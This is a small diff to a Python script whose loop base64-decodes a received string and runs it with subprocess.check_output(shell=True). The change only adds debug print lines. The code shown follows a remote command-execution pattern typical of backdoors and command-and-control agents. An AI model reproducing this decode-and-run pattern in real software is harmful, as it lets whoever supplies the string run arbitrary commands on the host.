@@ -32,9 +32,11 @@ while True:
                 str(ip)
                 ip = ip.replace(" ", "")
                 base64string = base64string.replace(" ", "")
+                print(base64string)
                 try:
                     base64.decodestring(base64string)
                     decodedcmd = base64.b64decode(base64string)
+                    print (decodedcmd)
                     cmd = subprocess.check_output(decodedcmd, shell=True);
                     print(cmd + "THIS IS WHEN IT'S FIRST EXECUTED")
                 except binascii.Error:
